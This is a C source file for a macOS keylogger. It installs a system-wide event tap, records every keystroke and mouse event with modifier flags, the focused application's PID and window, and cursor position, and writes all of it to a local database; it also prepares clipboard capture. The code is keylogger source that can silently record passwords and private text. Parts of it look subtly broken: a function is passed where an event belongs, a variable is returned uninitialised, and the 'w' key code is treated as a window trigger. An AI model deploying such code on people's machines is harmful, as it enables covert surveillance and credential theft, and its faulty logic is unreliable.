#pragma once
#include <assert.h>
#include <ctype.h>
#include <inttypes.h>
#include <signal.h>
#include <stdint.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <unistd.h>
/**********************************/
#include "hidapi/hidapi/hidapi.h"
#include "hidapi/mac/hidapi_darwin.h"
#include "keylogger.h"
#include "libusb/libusb/libusb.h"
#include "libusb/libusb/os/darwin_usb.h"
#include "pbpaste.h"
/**********************************/
typedef struct ctx_t              ctx_t;
typedef struct mouse_location_t   mouse_location_t;
typedef struct pids_t             pids_t;
typedef struct db_stats_t         db_stats_t;
typedef struct updates_t          updates_t;
typedef struct windows_t          windows_t;
typedef struct focus_t            focus_t;
typedef struct event_t            event_t;
typedef struct displays_t         displays_t;
typedef struct clipboard_t        clipboard_t;
/**********************************/
struct djbhash downkeys_h;
struct ctx_t {
  struct Vector *downkeys_v;
  char          *downkeys_csv;
  //////////////////////////////////////////
  enum {
    THREAD_RECEIVER,
    THREADS_QTY,
  }             worker_thread_type_id_t;
  //////////////////////////////////////////
  unsigned long last_event_ts;
  struct clipboard_t {
    char              *contents, *b64_encoded;
    size_t            contents_size, b64_encoded_size;
    unsigned long     last_update_ts;
    clipboard_event_t event;
  } clipboard_t;
  struct displays_t {
    int           qty;
    unsigned long last_update_ts;
  } displays_t;
  struct event_t {
    int qty;
  } event_t;
  struct focus_t {
    int           qty, key_code, key_action;
    unsigned long last_update_ts;
  } focus_t;
  struct db_stats_t {
    size_t        table_size, rows_qty;
    unsigned long last_update_ts;
  } db_stats_t;
  struct windows_t {
    int           qty;
    int           pixels_x, pixels_y;
    unsigned long last_update_ts;
  } windows_t;
  struct mouse_location_t {
    int           x, y;
    unsigned long last_update_ts;
  }                mouse_location_t;
  //////////////////////////////////////////
  mouse_location_t mouse_location;
  windows_t        windows;
  event_t          event;
  db_stats_t       db_stats;
  clipboard_t      clipboard;
  //////////////////////////////////////////
};
static ctx_t ctx = {
  .downkeys_v   = NULL,
  .downkeys_csv = NULL,
  .windows      = {
    .qty          = 0,
  },
  .mouse_location = {
    .x            = 0, .y= 0,
  },
};
static bool IsMouseEvent(CGEventType type);

static CFArrayRef windowList;
unsigned int      windows_qty    = 0;
static CGPoint    mouse_location = { .x = 0, .y = 0, };
unsigned long
                  events_qty = 0,
  mouse_events_qty           = 0,
  kb_events_qty              = 0
;


/**********************************/
static bool IsMouseEvent(CGEventType type) {
  return(
    type == kCGEventLeftMouseDown
    || type == kCGEventLeftMouseUp
    || type == kCGEventRightMouseDown
    || type == kCGEventLeftMouseDragged
    || type == kCGEventRightMouseDragged
    || type == kCGEventRightMouseUp
    || type == kCGEventMouseMoved
    || type == kCGEventOtherMouseUp
    || type == kCGEventOtherMouseDown
    || type == kCGEventOtherMouseDragged
    || type == kCGEventLeftMouseDragged
    || type == kCGEventScrollWheel
    || type == kCGEventRightMouseDragged
    );
}


/**********************************/
static volatile CGEventMask kb_events = (
  CGEventMaskBit(kCGEventKeyDown)
  | CGEventMaskBit(kCGEventKeyUp)
  | CGEventMaskBit(kCGEventFlagsChanged)
  );
static volatile CGEventMask kb_down_events = (
  CGEventMaskBit(kCGEventKeyDown)
  | CGEventMaskBit(kCGEventFlagsChanged)
  );

static volatile CGEventMask mouse_and_kb_events = (
  CGEventMaskBit(kCGEventKeyDown)
  | CGEventMaskBit(kCGEventKeyUp)
  | CGEventMaskBit(kCGEventFlagsChanged)
  | CGEventMaskBit(kCGEventLeftMouseDown)
  | CGEventMaskBit(kCGEventLeftMouseUp)
  | CGEventMaskBit(kCGEventRightMouseDown)
  | CGEventMaskBit(kCGEventRightMouseUp)
  | CGEventMaskBit(kCGEventMouseMoved)
  | CGEventMaskBit(kCGEventOtherMouseDown)
  | CGEventMaskBit(kCGEventOtherMouseUp)
  | CGEventMaskBit(kCGEventOtherMouseDragged)
  | CGEventMaskBit(kCGEventScrollWheel)
  | CGEventMaskBit(kCGEventLeftMouseDragged)
  | CGEventMaskBit(kCGEventRightMouseDragged)
  );


/**********************************/
static int tap_events(){
  CFRunLoopRun();
  return(0);
}


bool isKeyboardEvent(CGEventType type) {
  return((type == kCGEventKeyDown) || (type == kCGEventKeyUp));
}


bool isMouseCursorEvent(CGEventType type) {
  return((type == kCGEventLeftMouseDown)
         || (type == kCGEventLeftMouseUp)
         || (type == kCGEventRightMouseDown)
         || (type == kCGEventRightMouseUp)
         || (type == kCGEventMouseMoved));
}


static int setup_event_tap(){
  CFMachPortRef event_tap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, mouse_and_kb_events, event_handler, NULL);

  if (!event_tap) {
    fprintf(stderr, "ERROR: Unable to create keyboard event tap.\n");
    return(1);
  }
  CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, event_tap, 0);

  CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
  CGEventTapEnable(event_tap, true);
  return(0);
}


/**********************************/
int init(){
  assert(keylogger_init_db() == 0);
  assert(keylogger_create_db() == 0);
  mouse_location   = CGEventGetLocation(event_handler);
  ctx.downkeys_v   = vector_new();
  ctx.downkeys_csv = "";
  djbhash_init(&downkeys_h);
  return(0);
}


/**********************************/


void key_not_down(const KEYCODE){
  for (int i = 0; i < vector_size(ctx.downkeys_v); i++) {
    if ((int)vector_get(ctx.downkeys_v, i) == KEYCODE) {
      vector_remove(ctx.downkeys_v, i);
      return;
    }
  }
  return;
}


bool key_is_down(const KEYCODE){
  for (int i = 0; i < vector_size(ctx.downkeys_v); i++) {
    if ((int)vector_get(ctx.downkeys_v, i) == KEYCODE) {
      return(true);
    }
  }
  return(false);
}


char *down_keys_csv(){
  struct StringBuffer *SB = stringbuffer_new_with_options(1024, true);

  for (int i = 0; i < vector_size(ctx.downkeys_v); i++) {
    int dk = (int)vector_get(ctx.downkeys_v, i);
    if (i > 0) {
      stringbuffer_append_string(SB, ", ");
    }
    stringbuffer_append_int(SB, dk);
  }
  char *S = stringbuffer_to_string(SB);

  stringbuffer_release(SB);
  return(S);
}


ssize_t get_usb_devices_qty(){
  libusb_device **devs;
  ssize_t       qty;

  int           r = libusb_init(NULL);

  if (r < 0) {
    return(qty);
  }

  qty = libusb_get_device_list(NULL, &devs);
  if (qty < 0) {
    libusb_exit(NULL);
    return(qty);
  }
  libusb_free_device_list(devs, 1);

  libusb_exit(NULL);
  return(qty);
}


CGEventRef event_handler(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
  unsigned long TS = (unsigned long)timestamp();
  char          *action = "UNKNOWN", *ckc = "UNKNOWN", *input_type = "UNKNOWN";
  CGKeyCode     keyCode = 0;

  bool
    key_up      = ((type == kCGEventKeyUp) ? true : false),
    key_down    = ((type == kCGEventKeyDown) ? true : false),
    is_mouse    = ((IsMouseEvent(type)) ? true : false),
    is_keyboard = ((is_mouse) ? false : true)
  ;

  unsigned long       event_flags    = (int)CGEventGetFlags(event);
  struct StringBuffer *event_flag_sb = stringbuffer_new_with_options(0, true);

  if (event_flags & kCGEventFlagMaskAlternate) {
    stringbuffer_append_string(event_flag_sb, "alternate+");
  }
  if (event_flags & kCGEventFlagMaskSecondaryFn) {
    stringbuffer_append_string(event_flag_sb, "secondaryfxn+");
  }
  if (event_flags & kCGEventFlagMaskCommand) {
    stringbuffer_append_string(event_flag_sb, "command+");
  }
  if (event_flags & kCGEventFlagMaskControl) {
    stringbuffer_append_string(event_flag_sb, "control+");
  }
  if (event_flags & kCGEventFlagMaskShift) {
    stringbuffer_append_string(event_flag_sb, "shift+");
  }

  char *event_flag = stringbuffer_to_string(event_flag_sb);

  stringbuffer_release(event_flag_sb);


  input_type = ((is_mouse) ? "mouse" : ((is_keyboard) ? ("keyboard") : ("UNKNOWN")));
  action     = ((key_up) ? "UP" : ((key_down) ? "DOWN" : is_mouse ? "MOUSE" : "UNKNOWN"));

  if (is_mouse) {
    mouse_location = CGEventGetLocation(event);
    keyCode        = (CGKeyCode)CGEventGetIntegerValueField(event, kCGMouseEventButtonNumber) + 1;
    ckc            = "MOUSE";
  }else{
    keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
    ckc     = convertKeyboardCode(keyCode);
  }

  if (key_up && key_is_down((int)keyCode)) {
    key_not_down((int)keyCode);
  }else if (key_down && !key_is_down((int)keyCode)) {
    vector_push(ctx.downkeys_v, (int)keyCode);
  }

  int focused_pid = (int)get_front_window_pid();

  int ok1 = keylogger_insert_db_row(&(logged_key_event_t){
    .ts               = (uint64_t)TS,
    .qty              = 1,
    .key_code         = (unsigned long)keyCode,
    .key_string       = (char *)strdup(ckc),
    .action           = (char *)strdup(action),
    .mouse_x          = (unsigned long)mouse_location.x,
    .mouse_y          = (unsigned long)mouse_location.y,
    .input_type       = input_type,
    .downkeys_v       = ctx.downkeys_v,
    .downkeys_csv     = down_keys_csv(),
    .focused_pid      = focused_pid,
    .active_window_id = (int)get_pid_window_id(focused_pid),
    .devices_qty      = (size_t)0,
    .event_flags      = event_flags,
    .event_flag       = event_flag,
    .usb_devices_qty  = get_usb_devices_qty(),
  });

  assert(ok1 == 0);

  if (keyCode == 13) {
    int ok2 = keylogger_insert_db_window_row();
    assert(ok2 == 0);
  }

  return(event);
} /* CGEventCallback */


static const char *convertKeyboardCode(int keyCode) {
  switch ((int)keyCode) {
  case 0:   return("a");

  case 1:   return("s");

  case 2:   return("d");

  case 3:   return("f");

  case 4:   return("h");

  case 5:   return("g");

  case 6:   return("z");

  case 7:   return("x");

  case 8:   return("c");

  case 9:   return("v");

  case 11:  return("b");

  case 12:  return("q");

  case 13:  return("w");

  case 14:  return("e");

  case 15:  return("r");

  case 16:  return("y");

  case 17:  return("t");

  case 18:  return("1");

  case 19:  return("2");

  case 20:  return("3");

  case 21:  return("4");

  case 22:  return("6");

  case 23:  return("5");

  case 24:  return("=");

  case 25:  return("9");

  case 26:  return("7");

  case 27:  return("-");

  case 28:  return("8");

  case 29:  return("0");

  case 30:  return("]");

  case 31:  return("o");

  case 32:  return("u");

  case 33:  return("[");

  case 34:  return("i");

  case 35:  return("p");

  case 37:  return("l");

  case 38:  return("j");

  case 39:  return("'");

  case 40:  return("k");

  case 41:  return(";");

  case 42:  return("\\");

  case 43:  return(",");

  case 44:  return("/");

  case 45:  return("n");

  case 46:  return("m");

  case 47:  return(".");

  case 50:  return("`");

  case 65:  return("[decimal]");

  case 67:  return("[asterisk]");

  case 69:  return("[plus]");

  case 71:  return("[clear]");

  case 75:  return("[divide]");

  case 76:  return("[enter]");

  case 78:  return("[hyphen]");

  case 81:  return("[equals]");

  case 82:  return("0");

  case 83:  return("1");

  case 84:  return("2");

  case 85:  return("3");

  case 86:  return("4");

  case 87:  return("5");

  case 88:  return("6");

  case 89:  return("7");

  case 91:  return("8");

  case 92:  return("9");

  case 36:  return("[return]");

  case 48:  return("[tab]");

  case 49:  return(" ");

  case 51:  return("[del]");

  case 53:  return("[esc]");

  case 54:  return("[right-cmd]");

  case 55:  return("[left-cmd]");

  case 56:  return("[left-shift]");

  case 57:  return("[caps]");

  case 58:  return("[left-option]");

  case 59:  return("[left-ctrl]");

  case 60:  return("[right-shift]");

  case 61:  return("[right-option]");

  case 62:  return("[right-ctrl]");

  case 63:  return("[fn]");

  case 64:  return("[f17]");

  case 72:  return("[volup]");

  case 73:  return("[voldown]");

  case 74:  return("[mute]");

  case 79:  return("[f18]");

  case 80:  return("[f19]");

  case 90:  return("[f20]");

  case 96:  return("[f5]");

  case 97:  return("[f6]");

  case 98:  return("[f7]");

  case 99:  return("[f3]");

  case 100: return("[f8]");

  case 101: return("[f9]");

  case 103: return("[f11]");

  case 105: return("[f13]");

  case 106: return("[f16]");

  case 107: return("[f14]");

  case 109: return("[f10]");

  case 111: return("[f12]");

  case 113: return("[f15]");

  case 114: return("[help]");

  case 115: return("[home]");

  case 116: return("[pgup]");

  case 117: return("[fwddel]");

  case 118: return("[f4]");

  case 119: return("[end]");

  case 120: return("[f2]");

  case 121: return("[pgdown]");

  case 122: return("[f1]");

  case 123: return("[left]");

  case 124: return("[right]");

  case 125: return("[down]");

  case 126: return("[up]");
  } /* switch */
  fprintf(stderr, "UNKNOWN KEY: %d\n", keyCode);
  return("[unknown]");
} /* convertKeyCode */


/**********************************/
int keylogger_exec() {
  assert(init() == 0);
  assert(setup_event_tap() == 0);
  assert(tap_events() == 0);
  return(0);
}
/**********************************/
